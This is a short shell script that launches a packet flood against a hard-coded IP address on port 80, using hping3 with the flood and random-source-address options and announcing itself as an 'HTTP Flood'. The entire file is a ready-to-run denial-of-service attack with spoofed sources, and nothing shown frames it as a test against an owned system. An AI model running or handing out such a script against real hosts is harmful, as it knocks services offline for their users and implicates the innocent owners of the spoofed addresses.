#!/bin/sh

IP=20.79.0.2
PORT=80
echo "Running HTTP Flood on $IP:$PORT..."

hping3 --flood -V --rand-source $IP -p $PORT